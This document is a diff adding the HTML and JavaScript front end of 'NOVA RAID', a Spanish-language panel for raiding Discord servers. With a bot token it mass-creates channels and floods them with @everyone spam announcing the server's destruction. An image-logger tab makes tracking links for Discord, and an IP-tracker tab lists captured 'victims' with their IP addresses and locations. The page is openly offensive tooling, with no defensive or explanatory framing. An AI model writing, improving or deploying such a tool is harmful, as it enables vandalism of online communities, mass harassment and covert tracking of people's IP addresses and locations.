@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOVA RAID | TERMINAL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(255, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 0, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glass-panel {
+            background: rgba(10, 10, 15, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .cyber-input {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #ff0000;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s;
+        }
+
+        .cyber-input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            outline: none;
+        }
+
+        .cyber-button {
+            background: linear-gradient(135deg, #ff0000, #990000);
+            border: none;
+            color: white;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .cyber-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px #ff0000;
+        }
+
+        .cyber-tab {
+            background: rgba(20, 0, 0, 0.3);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            color: rgba(255, 255, 255, 0.5);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .cyber-tab:hover {
+            color: white;
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+        }
+
+        .cyber-tab.active {
+            background: rgba(255, 0, 0, 0.2);
+            border-color: #ff0000;
+            color: white;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .server-card {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .server-card:hover {
+            border-color: #ff0000;
+            transform: translateX(5px);
+            box-shadow: -5px 0 20px rgba(255, 0, 0, 0.2);
+        }
+
+        .ip-log {
+            background: rgba(0, 0, 0, 0.7);
+            border-left: 3px solid #ff0000;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a0000;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .tab {
+            display: none;
+        }
+
+        .tab.active {
+            display: block;
+        }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+    <div class="max-w-7xl mx-auto relative z-10">
+        <!-- Header -->
+        <div class="mb-8 text-center">
+            <h1 class="text-5xl md:text-7xl font-black text-white mb-2">NOVA RAID</h1>
+            <div class="flex items-center justify-center gap-4">
+                <div class="h-[1px] w-12 bg-red-600"></div>
+                <p class="text-red-600 text-xs font-mono tracking-[0.5em] uppercase">TERMINAL v3.0</p>
+                <div class="h-[1px] w-12 bg-red-600"></div>
+            </div>
+        </div>
+
+        <!-- Pestañas -->
+        <div class="flex flex-wrap gap-2 mb-6">
+            <button class="cyber-tab active px-6 py-3" onclick="window.tab('raid',this)">🎯 RAID CONSOLE</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('servers',this)">📡 SERVER LIST</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('gen',this)">🔗 IMAGE LOGGER</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('logs',this)">👁️ IP TRACKER</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('active',this)">⚡ ACTIVE BOTS</button>
+        </div>
+
+        <!-- RAID CONSOLE -->
+        <div id="raid" class="tab active">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> BOT_TOKEN</label>
+                            <input type="password" id="rToken" class="cyber-input w-full p-4 rounded" placeholder="INGRESA EL TOKEN">
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="text-xs text-red-600 font-mono block mb-2">> CANALES (50)</label>
+                                <input type="number" id="rAmount" value="50" class="cyber-input w-full p-4 rounded">
+                            </div>
+                            <div>
+                                <label class="text-xs text-red-600 font-mono block mb-2">> MENSAJES (15)</label>
+                                <input type="number" id="rMsgCount" value="15" class="cyber-input w-full p-4 rounded">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> NOMBRE_CANAL</label>
+                            <input type="text" id="rChan" value="NOVA-RAIDED" class="cyber-input w-full p-4 rounded">
+                        </div>
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> MENSAJE_RAID</label>
+                            <textarea id="rMsg" rows="4" class="cyber-input w-full p-4 rounded">@everyone SERVIDOR DESTRUIDO POR NOVA RAID 🔥</textarea>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> TARGET_SERVER</label>
+                            <select id="rTarget" class="cyber-input w-full p-4 rounded">
+                                <option value="todos">🔥 TODOS LOS SERVIDORES</option>
+                            </select>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <button onclick="window.ejecutarRaid()" class="cyber-button w-full p-4 rounded">💣 INICIAR RAID</button>
+                            <button onclick="window.detenerRaid()" class="cyber-button w-full p-4 rounded" style="background: linear-gradient(135deg, #660000, #330000);">🛑 DETENER</button>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <button onclick="window.cargarServidores()" class="bg-transparent border border-red-800 hover:border-red-600 text-red-600 w-full py-4 rounded">🔍 CARGAR SERVIDORES</button>
+                            <button onclick="window.raidRapido()" class="bg-transparent border border-red-800 hover:border-red-600 text-red-600 w-full py-4 rounded">⚡ RAID EXPRESS</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IMAGE LOGGER (CORREGIDO) -->
+        <div id="gen" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="space-y-4">
+                        <h3 class="text-red-600 font-mono text-sm mb-4">> SUBIR IMAGEN</h3>
+                        <div id="dropArea" class="border-2 border-dashed border-red-900/50 hover:border-red-600 rounded-lg p-8 text-center cursor-pointer" onclick="document.getElementById('imageInput').click()">
+                            <input type="file" id="imageInput" accept="image/*" class="hidden" onchange="window.previsualizarImagen(this)">
+                            <div class="text-red-600 text-4xl mb-2">📸</div>
+                            <div class="text-gray-400 text-sm font-mono">Haz clic para seleccionar imagen</div>
+                        </div>
+                        <div id="previewArea" class="hidden">
+                            <img id="imagePreview" class="w-full rounded-lg border border-red-900/50" src="" alt="Preview">
+                        </div>
+                        <button onclick="window.subirImagen()" class="cyber-button w-full p-4 rounded">📤 SUBIR IMAGEN</button>
+                    </div>
+                    <div id="generatedLinks" class="hidden space-y-4">
+                        <div class="bg-black/50 p-4 rounded">
+                            <div class="text-xs text-gray-500 mb-2">URL DEL LOGGER:</div>
+                            <div id="loggerUrl" class="text-red-400 text-xs break-all font-mono"></div>
+                            <button onclick="window.copiarTexto('loggerUrl')" class="mt-2 text-[10px] text-red-600">📋 COPIAR</button>
+                        </div>
+                        <div class="bg-black/50 p-4 rounded">
+                            <div class="text-xs text-gray-500 mb-2">PARA DISCORD:</div>
+                            <div id="discordUrl" class="text-red-400 text-xs break-all font-mono"></div>
+                            <button onclick="window.copiarTexto('discordUrl')" class="mt-2 text-[10px] text-red-600">📋 COPIAR</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-8">
+                    <h3 class="text-red-600 font-mono text-sm mb-4">> IMÁGENES SUBIDAS</h3>
+                    <div id="imagesList" class="grid grid-cols-2 md:grid-cols-4 gap-3 max-h-60 overflow-y-auto p-2"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SERVER LIST -->
+        <div id="servers" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="mb-6">
+                    <h3 class="text-red-600 font-mono text-sm mb-4">> SERVIDORES_DISPONIBLES</h3>
+                    <div class="flex gap-4">
+                        <input type="password" id="sToken" placeholder="TOKEN DEL BOT" class="cyber-input flex-1 p-4 rounded">
+                        <button onclick="window.listarServidores()" class="cyber-button px-8 py-4 rounded">📡 ESCANEAR</button>
+                    </div>
+                </div>
+                <div id="serversList" class="space-y-2 max-h-96 overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- IP TRACKER -->
+        <div id="logs" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-red-600 font-mono text-sm">> VÍCTIMAS_CAPTURADAS</h3>
+                    <button onclick="window.updateLogs()" class="text-xs bg-red-950 hover:bg-red-900 text-red-400 px-4 py-2 rounded">🔄 REFRESCAR</button>
+                </div>
+                <div id="ipBox" class="space-y-2 h-96 overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- ACTIVE BOTS -->
+        <div id="active" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <h3 class="text-red-600 font-mono text-sm mb-6">> BOTS_ACTIVOS</h3>
+                <div id="activeBotsList" class="space-y-3"></div>
+                <button onclick="window.actualizarBotsActivos()" class="mt-4 text-xs bg-transparent border border-red-800 hover:border-red-600 text-red-600 px-6 py-3 rounded">⟲ ACTUALIZAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Variables globales
+        window.imagenActual = null;
+
+        // Función para cambiar pestañas
+        window.tab = function(id, el) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.cyber-tab').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            if (el) el.classList.add('active');
+        };
+
+        // RAID FUNCTIONS
+        window.ejecutarRaid = async function() {
+            const token = document.getElementById('rToken').value;
+            if (!token) {
+                alert('❌ Token requerido');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/raid', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        guildId: document.getElementById('rTarget').value,
+                        channelName: document.getElementById('rChan').value,
+                        message: document.getElementById('rMsg').value,
+                        amount: document.getElementById('rAmount').value,
+                        msgCount: document.getElementById('rMsgCount').value
+                    })
+                });
+                const data = await res.json();
+                alert(data.message || '✅ Raid iniciado');
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        };
+
+        window.detenerRaid = async function() {
+            const token = document.getElementById('rToken').value;
+            if (!token) return;
+            
+            const res = await fetch('/api/stop-raid', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            alert(data.message);
+        };
+
+        window.raidRapido = async function() {
+            const token = document.getElementById('rToken').value;
+            if (!token) {
+                alert('❌ Token requerido');
+                return;
+            }
+            
+            const res = await fetch('/api/raid-direct', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: token,
+                    channelName: document.getElementById('rChan').value,
+                    message: document.getElementById('rMsg').value
+                })
+            });
+            const data = await res.json();
+            alert(data.message || '⚡ Raid express iniciado');
+        };
+
+        window.cargarServidores = async function() {
+            const token = document.getElementById('rToken').value;
+            if (!token) {
+                alert('❌ Token requerido');
+                return;
+            }
+
+            const res = await fetch('/api/get-guilds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                const select = document.getElementById('rTarget');
+                select.innerHTML = '<option value="todos">🔥 TODOS LOS SERVIDORES</option>';
+                data.guilds.forEach(g => {
+                    select.innerHTML += `<option value="${g.id}">${g.name} (${g.memberCount} miembros)</option>`;
+                });
+                alert(`✅ ${data.guilds.length} servidores cargados`);
+            }
+        };
+
+        // IMAGE LOGGER FUNCTIONS
+        window.previsualizarImagen = function(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('imagePreview').src = e.target.result;
+                    document.getElementById('previewArea').classList.remove('hidden');
+                    window.imagenActual = input.files[0];
+                };
+                reader.readAsDataURL(input.files[0]);
+            }
+        };
+
+        window.subirImagen = async function() {
+            if (!window.imagenActual) {
+                alert('❌ Selecciona una imagen primero');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('image', window.imagenActual);
+
+            try {
+                const res = await fetch('/api/upload-image', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    document.getElementById('loggerUrl').innerText = data.loggerUrl;
+                    document.getElementById('discordUrl').innerText = data.discordPreview;
+                    document.getElementById('generatedLinks').classList.remove('hidden');
+                    alert('✅ Imagen subida correctamente');
+                    window.cargarImagenes();
+                }
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        };
+
+        window.cargarImagenes = async function() {
+            try {
+                const res = await fetch('/api/images');
+                const images = await res.json();
+                const list = document.getElementById('imagesList');
+                list.innerHTML = images.map(img => `
+                    <div class="bg-black/50 p-2 rounded">
+                        <img src="${img.url}" class="w-full h-16 object-cover rounded mb-2">
+                        <div class="text-[8px] text-gray-500">${img.views || 0} vistas</div>
+                    </div>
+                `).join('');
+            } catch (e) {}
+        };
+
+        // IP LOGS FUNCTIONS
+        window.updateLogs = async function() {
+            try {
+                const res = await fetch('/api/ip-logs');
+                const data = await res.json();
+                const box = document.getElementById('ipBox');
+                box.innerHTML = data.map(l => `
+                    <div class="ip-log p-3 rounded">
+                        <div class="flex justify-between">
+                            <span class="text-red-500">${l.ip}</span>
+                            <span class="text-gray-600">${l.date}</span>
+                        </div>
+                        <div class="text-gray-400 text-[10px]">📍 ${l.geo}</div>
+                    </div>
+                `).join('') || '<div class="text-gray-700 p-4">🚫 NO HAY DATOS</div>';
+            } catch (e) {}
+        };
+
+        // ACTIVE BOTS FUNCTIONS
+        window.actualizarBotsActivos = async function() {
+            try {
+                const res = await fetch('/api/active-bots');
+                const bots = await res.json();
+                const list = document.getElementById('activeBotsList');
+                list.innerHTML = bots.map(b => `
+                    <div class="bg-black/50 p-4 rounded">
+                        <div class="text-red-500">${b.user}</div>
+                        <div class="text-gray-500 text-xs">Canales: ${b.stats?.canalesCreados || 0}</div>
+                    </div>
+                `).join('') || '<div class="text-gray-700 p-4">⚡ NO HAY BOTS ACTIVOS</div>';
+            } catch (e) {}
+        };
+
+        window.copiarTexto = function(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(text);
+            alert('📋 Copiado al portapapeles');
+        };
+
+        window.listarServidores = async function() {
+            const token = document.getElementById('sToken').value;
+            if (!token) {
+                alert('❌ Token requerido');
+                return;
+            }
+
+            const res = await fetch('/api/get-guilds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                const list = document.getElementById('serversList');
+                list.innerHTML = data.guilds.map(g => `
+                    <div class="server-card p-4 rounded" onclick="document.getElementById('rToken').value='${token}'; document.getElementById('rTarget').value='${g.id}'; window.tab('raid', null);">
+                        <div class="font-bold text-red-500">${g.name}</div>
+                        <div class="text-gray-500 text-xs">Miembros: ${g.memberCount}</div>
+                    </div>
+                `).join('');
+            }
+        };
+
+        // Auto-refresh cada 5 segundos
+        setInterval(() => {
+            if (document.getElementById('logs').classList.contains('active')) {
+                window.updateLogs();
+            }
+            if (document.getElementById('active').classList.contains('active')) {
+                window.actualizarBotsActivos();
+            }
+        }, 5000);
+
+        // Cargar imágenes al iniciar
+        window.cargarImagenes();
+    </script>
+</body>
+</html>
